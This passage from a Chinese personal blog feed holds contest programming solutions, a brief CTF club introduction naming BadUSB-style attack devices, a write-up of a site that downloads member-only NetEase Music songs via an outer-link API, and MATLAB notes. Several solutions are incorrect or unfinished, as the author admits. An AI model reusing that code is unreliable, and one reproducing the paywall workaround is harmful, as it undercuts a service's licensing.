class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">summary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ls = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>))</span><br><span class="line">MaxPermutations = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(ls):</span><br><span class="line">    lesscount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i.index(j),<span class="built_in">len</span>(i)):</span><br><span class="line">            <span class="keyword">if</span> j &lt; i[k]: lesscount += <span class="number">1</span></span><br><span class="line">    summary += lesscount</span><br><span class="line">mods = summary % <span class="number">998244353</span></span><br><span class="line"><span class="built_in">print</span>(mods)</span><br><span class="line"><span class="comment">##    if i[0] == n: MaxPermutations.append(i)</span></span><br><span class="line"><span class="comment">##    else: break</span></span><br><span class="line"><span class="comment">##print(MaxPermutations)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-H-技能升级"><a href="#试题-H-技能升级" class="headerlink" title="试题 H: 技能升级"></a>试题 H: 技能升级</h2><ul><li>时间限制: 1.0s </li><li>内存限制: 512.0MB </li><li>本题总分：20 分 </li><li>【问题描述】<br>小蓝最近正在玩一款 RPG 游戏。他的角色一共有 N 个可以加攻击力的技 能。其中第 i 个技能首次升级可以提升 Ai 点攻击力，以后每次升级增加的点数 都会减少 Bi。⌈ Ai Bi ⌉ (上取整) 次之后，再升级该技能将不会改变攻击力。 现在小蓝可以总计升级 M 次技能，他可以任意选择升级的技能和次数。请 你计算小蓝最多可以提高多少点攻击力？ </li><li>【输入格式】<br>输入第一行包含两个整数 N 和 M。 以下 N 行每行包含两个整数 Ai 和 Bi。 </li><li>【输出格式】<br>输出一行包含一个整数表示答案。 </li><li>【样例输入】<br>3 6 10 5 9 2 8 1 </li><li>【样例输出】<br>47 </li><li>【评测用例规模与约定】<br>对于 40% 的评测用例，1 ≤ N, M ≤ 1000；<br>对于 60% 的评测用例，1 ≤ N ≤ 104 , 1 ≤ M ≤ 107；<br> 对于所有评测用例，1 ≤ N ≤ 105，1 ≤ M ≤ 2 × 109，1 ≤ Ai , Bi ≤ 106。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line">TotalATK = <span class="number">0</span></span><br><span class="line">SkillCounts, UpgradeTimes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">Skills = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(SkillCounts):</span><br><span class="line">    ATK, PointMinus = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">    MaxUpgradeTimes = ceil(ATK/PointMinus)</span><br><span class="line">    Skills.append([ATK, PointMinus, MaxUpgradeTimes])</span><br><span class="line"></span><br><span class="line">Skills.sort(key=<span class="keyword">lambda</span> s: s[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(UpgradeTimes):</span><br><span class="line">    TotalATK += Skills[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    Skills[<span class="number">0</span>][<span class="number">0</span>] -= Skills[<span class="number">0</span>][<span class="number">1</span>]    <span class="comment"># ATK减少固定值</span></span><br><span class="line">    Skills[<span class="number">0</span>][<span class="number">2</span>] -= <span class="number">1</span>   <span class="comment"># 可升级次数-1</span></span><br><span class="line">    Skills.sort(key=<span class="keyword">lambda</span> s: s[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(TotalATK)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-I-最长不下降子序列"><a href="#试题-I-最长不下降子序列" class="headerlink" title="试题 I: 最长不下降子序列"></a>试题 I: 最长不下降子序列</h2><ul><li>时间限制: 1.0s </li><li>内存限制: 512.0MB </li><li>本题总分：25 分 </li><li>【问题描述】<br>给定一个长度为 N 的整数序列：A1, A2, · · · , AN。现在你有一次机会，将其 中连续的 K 个数修改成任意一个相同值。请你计算如何修改可以使修改后的数 列的最长不下降子序列最长，请输出这个最长的长度。 最长不下降子序列是指序列中的一个子序列，子序列中的每个数不小于在 它之前的数。</li><li>【输入格式】<br>输入第一行包含两个整数 N 和 K。 第二行包含 N 个整数 A1, A2, · · · , AN。 </li><li>【输出格式】<br>输出一行包含一个整数表示答案。 </li><li>【样例输入】<br>5 1 1 4 2 8 5 </li><li>【样例输出】<br>4 </li><li>【评测用例规模与约定】<br>对于 20% 的评测用例，1 ≤ K ≤ N ≤ 100；<br>对于 30% 的评测用例，1 ≤ K ≤ N ≤ 1000；<br>对于 50% 的评测用例，1 ≤ K ≤ N ≤ 10000；<br>对于所有评测用例，1 ≤ K ≤ N ≤ 10^5，1 ≤ Ai ≤ 10^6。</li></ul><blockquote><p><strong>好像我的做法有点bug？</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Counts, Constant = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">Array = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">SubCount = []</span><br><span class="line"><span class="comment"># 前面的往小了改的话就得改成0，后面的往大了改就可以改很大</span></span><br><span class="line"></span><br><span class="line">Min = []</span><br><span class="line">Max = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Array)):</span><br><span class="line">    Min.append(<span class="built_in">min</span>(Array[i:]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Max.append(<span class="built_in">max</span>(Array[:i]))</span><br><span class="line">    <span class="keyword">except</span> ValueError:      <span class="comment"># 第一个数字前面没有数字</span></span><br><span class="line">        Max.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Min)):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(Min)-<span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">    Count = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> Min[i+<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> j &gt;= Min[i]: Count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">    SubCount.append(Count)</span><br><span class="line">MaxSubCount = <span class="built_in">max</span>(SubCount)     <span class="comment"># 获取当前最长子序列的位置</span></span><br><span class="line"><span class="keyword">if</span> SubCount.index(MaxSubCount)+<span class="number">1</span> &lt;= Constant:</span><br><span class="line">    Result = SubCount.index(MaxSubCount) + MaxSubCount</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Result = MaxSubCount + Constant</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-J-最优清零方案"><a href="#试题-J-最优清零方案" class="headerlink" title="试题 J: 最优清零方案"></a>试题 J: 最优清零方案</h2><ul><li>时间限制: 5.0s </li><li>内存限制: 512.0MB </li><li>本题总分：25 分 </li><li>【问题描述】<br>给定一个长度为 N 的数列 A1, A2, · · · , AN。现在小蓝想通过若干次操作将 这个数列中每个数字清零。 每次操作小蓝可以选择以下两种之一： 1. 选择一个大于 0 的整数，将它减去 1； 2. 选择连续 K 个大于 0 的整数，将它们各减去 1。 小蓝最少经过几次操作可以将整个数列清零？ </li><li>【输入格式】<br>输入第一行包含两个整数 N 和 K。 第二行包含 N 个整数 A1, A2, · · · , AN。 </li><li>【输出格式】<br>输出一个整数表示答案。 </li><li>【样例输入】<br>4 2 1 2 3 4 </li><li>【样例输出】<br>6 </li><li>【评测用例规模与约定】<br>对于 20% 的评测用例，1 ≤ K ≤ N ≤ 10。<br>对于 40% 的评测用例，1 ≤ K ≤ N ≤ 100。<br>对于 50% 的评测用例，1 ≤ K ≤ N ≤ 1000。<br>对于 60% 的评测用例，1 ≤ K ≤ N ≤ 10000。<br>对于 70% 的评测用例，1 ≤ K ≤ N ≤ 100000。<br>对于所有评测用例，1 ≤ K ≤ N ≤ 1000000, 0 ≤ Ai ≤ 1000000。</li></ul><blockquote><p><strong>印象中这题没做完？</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Length, Constant = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)))   <span class="comment"># 获得数列长度以及连续的数字的数量K</span></span><br><span class="line">Array = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)))  <span class="comment"># 构造输入的数列</span></span><br><span class="line">MinusTimes = []</span><br><span class="line"></span><br><span class="line"><span class="comment">##def GetConstantArray(array):</span></span><br><span class="line"><span class="comment">##    ConstantPosList = []</span></span><br><span class="line"><span class="comment">##    for i in range(len(array)):</span></span><br><span class="line"><span class="comment">##        if i == len(array)-1: break</span></span><br><span class="line"><span class="comment">##        if array[i]+1 == array[i]:</span></span><br><span class="line"><span class="comment">##            StartPos = i</span></span><br><span class="line"><span class="comment">##            CusPos = i+1</span></span><br><span class="line"><span class="comment">##            EndPos = i+1</span></span><br><span class="line"><span class="comment">##            while 1:</span></span><br><span class="line"><span class="comment">##                if CurPos+1 &gt;= len(array):        # 指针已经指向最后一个数字了</span></span><br><span class="line"><span class="comment">##                    ConstantPosList.append((StartPos, EndPos))      # 将位置信息存储进入列表中，终止循环</span></span><br><span class="line"><span class="comment">##                    break                    </span></span><br><span class="line"><span class="comment">##                if array[CurPos+1] == array[CurPos]+1: CurPos += 1      # 当指针指向的下一个数字与当前指向的数字+1相等就继续</span></span><br><span class="line"><span class="comment">##                else:   # 指针指向的下一个数字与当前数字+1不相等</span></span><br><span class="line"><span class="comment">##                    ConstantPosList.append((StartPos, EndPos))      # 将位置信息存储进入列表中，终止循环</span></span><br><span class="line"><span class="comment">##                    break</span></span><br><span class="line"><span class="comment">##    return ConstantPosList</span></span><br><span class="line"><span class="comment">##print(GetConstantArray(Array))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Length):</span><br><span class="line">    <span class="keyword">if</span> i+Constant &gt;= Length+<span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">    MinusTimes.append(<span class="built_in">max</span>(Array[i:i+Constant]))</span><br><span class="line"></span><br><span class="line">MaxMinusTimes = <span class="built_in">max</span>(MinusTimes)</span><br><span class="line">MaxMinusTimesPos = MinusTimes.index(MaxMinusTimes)</span><br><span class="line">MinusTimesSum = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Constant):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        MinusTimesSum.append(<span class="built_in">sum</span>(MinusTimes[MaxMinusTimesPos-i:MaxMinusTimes+i]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        MinusTimesSum.append(<span class="built_in">sum</span>(MinusTimes[MaxMinusTimesPos-i:]))</span><br><span class="line">MaxMinusTimesSumPos = MinusTimesSum.index(<span class="built_in">max</span>(MinusTimesSum))    <span class="comment"># 确定从哪里开始减，怎么减</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）01 —— CTF入门</title>
      <link href="/posts/CTF-in-College-1/"/>
      <url>/posts/CTF-in-College-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>因为学校开启俱乐部活动了，然后我选的是网络攻防俱乐部，本身之前就玩过一些东西，顺带记点东西，便开启了这个坑~</p><p><strong><font color='#FF0000'>所有未经允许的入侵均为违法</font></strong></p><h3 id="USB-Ninja"><a href="#USB-Ninja" class="headerlink" title="USB Ninja"></a>USB Ninja</h3><p>一个可以伪装成各种正常的USB设备的攻击设备，因为体积非常小，甚至可以伪装成普通的数据线，鼠标啥的，有配套的手机蓝牙控制程序</p><p>不过因为好像是蓝牙控制所以距离应该……</p><h3 id="资源搜索"><a href="#资源搜索" class="headerlink" title="资源搜索"></a>资源搜索</h3><p>B站、Google等（B站永远滴神！）</p><h3 id="从软件入门网络安全"><a href="#从软件入门网络安全" class="headerlink" title="从软件入门网络安全"></a>从软件入门网络安全</h3><ul><li>脚本：Python、VBS、批处理、bash、ps1（Powershell）</li><li>系统：Windows、Linux</li><li>流程：Kali</li></ul><h3 id="从硬件入门网络安全"><a href="#从硬件入门网络安全" class="headerlink" title="从硬件入门网络安全"></a>从硬件入门网络安全</h3><ul><li>BadUSB作为模拟键盘生成恶意脚本产生攻击（17年在美国黑客大会提出，然而19年被国内的大佬们玩烂了额呵呵呵呵呵呵呵呵呵呵）【atmega32】</li><li>（然后我想起了在我家里吃灰的那一套Arduino）</li></ul><h3 id="在短时间内提高的方法——CTF训练平台"><a href="#在短时间内提高的方法——CTF训练平台" class="headerlink" title="在短时间内提高的方法——CTF训练平台"></a>在短时间内提高的方法——CTF训练平台</h3><ul><li><a href="https://ctf.bugku.com/">首页 - Bugku CTF</a></li><li><a href="https://buuoj.cn/">BUUCTF在线评测 (buuoj.cn)</a></li><li>etc.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NeteaseMusicDownload —— 网易云音乐自助下载网站</title>
      <link href="/posts/NeteaseMusicDownload/"/>
      <url>/posts/NeteaseMusicDownload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://user-images.githubusercontent.com/28426291/153402900-8a18d94d-b975-4b1f-81d0-83e97c82e64c.png" alt="下载站主页"></p><hr><p>这个项目起源于一个生活小例子。昨天(2022.2.9)我在剪视频，然后需要<a href="https://music.163.com/song?id=1472480890&userid=252340012">某一首歌</a>，结果网易云直接不给我下（会员限定）</p><p><img src="https://user-images.githubusercontent.com/28426291/153404219-8b7d9939-290c-4eaa-9874-a0f668ccb148.png"></p><p>那没办法，我只能看看找点别的办法，最开始想到的是<a href="https://github.com/nondanee/UnblockNeteaseMusic">@nondanee&#x2F;unblocknetease</a>这个项目，但是这个项目年久失修，我打开了代理通道后，网易云接入就发现，网易云提示未连接到网络，说白了就是用不了</p><p>后来我想到我手头上有网易云音乐的对外链接的api，想想应该可以拿这个东西搞定这个事情，这个项目便诞生了~</p><hr><h2 id="找模板"><a href="#找模板" class="headerlink" title="找模板"></a>找模板</h2><p>做一个网站，首先颜值必须得高，这里我去html5up找了一个模板来用（因为懒QAQ）</p><p>因为这个网站所需要的元素很简单，就是一个输入框、一个按钮而已</p><p><img src="https://user-images.githubusercontent.com/28426291/153545338-7c99eea0-2077-42b4-8b49-3f6bafb7114c.png"></p><p>最终找了Eventually这个模板，下载下来进行修改</p><h2 id="写按钮事件"><a href="#写按钮事件" class="headerlink" title="写按钮事件"></a>写按钮事件</h2><p>这里就是要用户把链接帖进去，然后把输入的内容的网易云域名改为我的api域名，所以就在JavaScript里面做了一下字符串替换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openNew</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;link&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">NeteaseReg</span> = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;music.163.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> schemeReg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">NeteaseReg</span>.<span class="title function_">test</span>(link) &amp;&amp; schemeReg.<span class="title function_">test</span>(link)) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ToOpen</span> = link.<span class="title function_">replace</span>(<span class="string">&quot;music.163.com&quot;</span>, <span class="string">&quot;api.ninym.top&quot;</span>).<span class="title function_">replace</span>(<span class="string">&quot;/#/&quot;</span>,<span class="string">&quot;/&quot;</span>);  <span class="comment">//防止解析暴毙</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="title class_">ToOpen</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;请输入正确的网易云链接！\n例如 https://music.163.com/song?id=467787951&amp;userid=252340012&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里用了两个正则表达式来判断是否含有网易云域名和是否为http(s)链接，如果不是就弹出提示，如果是就跳转到下一个页面</p><p>在<code>/song</code>页面下，再写一个JavaScript，直接获取网易云的外链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">GetQueryString</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>, <span class="string">&quot;i&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(reg); <span class="comment">//获取url中&quot;?&quot;符后的字符串并正则匹配</span></span><br><span class="line">    <span class="keyword">var</span> context = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="literal">null</span>)</span><br><span class="line">    context = r[<span class="number">2</span>];</span><br><span class="line">    reg = <span class="literal">null</span>;</span><br><span class="line">    r = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> context == <span class="literal">null</span> || context == <span class="string">&quot;&quot;</span> || context == <span class="string">&quot;undefined&quot;</span> ? <span class="string">&quot;&quot;</span> : context;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">GetQueryString</span>(<span class="string">&quot;id&quot;</span>) == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://music.163.com/song/media/outer/url?id=&#x27;</span>+<span class="title class_">GetQueryString</span>(<span class="string">&quot;id&quot;</span>)+<span class="string">&#x27;.mp3&#x27;</span>,<span class="string">&#x27;_self&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>GetQueryString</code>是将连接中的query参数解析出来，因为这里只需要用到id这个参数，所以判断一下如果id为空，就不采取任何操作，如果id不为空，就跳转到网易云链接进行下载</p><h2 id="打包上传"><a href="#打包上传" class="headerlink" title="打包上传"></a>打包上传</h2><p>接着将用户页打包上传到Github仓库<a href="https://github.com/GamerNoTitle/NeteaseMusicDownload">GamerNoTitle&#x2F;NeteaseMusicDownload: 一个可以下载网易云歌曲的网站</a>，将api上传到另一个Github仓库并绑定不同的域名，就完成啦！</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB学习笔记 20211125</title>
      <link href="/posts/MATLAB20211125/"/>
      <url>/posts/MATLAB20211125/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>注：使用<code>class(x)</code>可以获得x变量的类型</p><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>位数有8、16、32、64位</p><p>无符号型<code>uint8(x)</code>，范围是0<del>2^8-1 (00000000</del>11111111)</p><p>有符号型<code>int8(x)</code>，范围是-2^7<del>2^7-1 (10000000</del>01111111)</p><h4 id="典例："><a href="#典例：" class="headerlink" title="典例："></a>典例：</h4><p>x &#x3D; int8(129) 输出 x&#x3D;127（超出了范围）</p><p>x &#x3D; uint8(129) 输出 x&#x3D;129</p><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><p>分为单精度(single,4bytes)和双精度(double,8bytes)，默认为双精度</p><p><code>single(x)</code> 转为单精度型 <code>double(x)</code> 转为双精度型</p><h3 id="复型"><a href="#复型" class="headerlink" title="复型"></a>复型</h3><p>（其实就是复数，与Python差不多）</p><p>a+bi or a+bj（i与j一样）</p><p>使用real函数求得实部，imag函数求得虚部</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>format命令，使用方法为<code>format 变量类型</code>，只影响数据的输出格式而不影响计算和存储</p><p>回到默认输出格式的话直接使用<code>format</code>即可</p><h2 id="常用数学函数"><a href="#常用数学函数" class="headerlink" title="常用数学函数"></a>常用数学函数</h2><h3 id="函数运算规则"><a href="#函数运算规则" class="headerlink" title="函数运算规则"></a>函数运算规则</h3><p>函数的自变量规定为矩阵变量，也可以是标量（为矩阵的一种特例），运算时将函数逐项作用于矩阵每个元素上，输出结果为矩阵</p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><p>三角函数类<code>sin(x)</code>（x为弧度）<code>sind(x)</code>（x为角度）</p><p><code>exp(x)</code> 对x进行<code>e^x</code>的运算</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><h5 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h5><p>以弧度为单位则直接使用，以角度为单位则要在后面加<code>d</code>，例如</p><p><code>sin(radian)</code> &amp; <code>sind(degree)</code></p><h5 id="绝对值"><a href="#绝对值" class="headerlink" title="绝对值"></a>绝对值</h5><p>就是<code>abs(x)</code>，与python一样，但是有种特殊用法是求字符串的ASCII码</p><p>例如<code>abs(&#39;a&#39;)</code>会输出<code>97</code></p><h5 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h5><p>与C++有点类似</p><p><code>round(x)</code>进行四舍五入取证</p><p><code>celi(x)</code>进行向上取整</p><p><code>floor(x)</code>进行向下取证</p><p><code>fix(x)</code>舍去小数取整（实际上是取距离0近的那个数）</p><h5 id="计算函数"><a href="#计算函数" class="headerlink" title="计算函数"></a>计算函数</h5><p><code>rem(x,y)</code> 求余函数，x为被除数，y为除数</p><p><code>isprime(n)</code> 判断n是否为素数，TRUE则返回1，FALSE则返回0</p><h3 id="向量生成"><a href="#向量生成" class="headerlink" title="向量生成"></a>向量生成</h3><p><code>x=1:100</code> 将1~100组成的所有整数作为向量赋给x</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span>:<span class="number">100</span></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">x =</span><br><span class="line"></span><br><span class="line">  列 <span class="number">1</span> 至 <span class="number">25</span></span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span>    <span class="number">10</span>    <span class="number">11</span>    <span class="number">12</span>    <span class="number">13</span>    <span class="number">14</span>    <span class="number">15</span>    <span class="number">16</span>    <span class="number">17</span>    <span class="number">18</span>    <span class="number">19</span>    <span class="number">20</span>    <span class="number">21</span>    <span class="number">22</span>    <span class="number">23</span>    <span class="number">24</span>    <span class="number">25</span></span><br><span class="line"></span><br><span class="line">  列 <span class="number">26</span> 至 <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    <span class="number">26</span>    <span class="number">27</span>    <span class="number">28</span>    <span class="number">29</span>    <span class="number">30</span>    <span class="number">31</span>    <span class="number">32</span>    <span class="number">33</span>    <span class="number">34</span>    <span class="number">35</span>    <span class="number">36</span>    <span class="number">37</span>    <span class="number">38</span>    <span class="number">39</span>    <span class="number">40</span>    <span class="number">41</span>    <span class="number">42</span>    <span class="number">43</span>    <span class="number">44</span>    <span class="number">45</span>    <span class="number">46</span>    <span class="number">47</span>    <span class="number">48</span>    <span class="number">49</span>    <span class="number">50</span></span><br><span class="line"></span><br><span class="line">  列 <span class="number">51</span> 至 <span class="number">75</span></span><br><span class="line"></span><br><span class="line">    <span class="number">51</span>    <span class="number">52</span>    <span class="number">53</span>    <span class="number">54</span>    <span class="number">55</span>    <span class="number">56</span>    <span class="number">57</span>    <span class="number">58</span>    <span class="number">59</span>    <span class="number">60</span>    <span class="number">61</span>    <span class="number">62</span>    <span class="number">63</span>    <span class="number">64</span>    <span 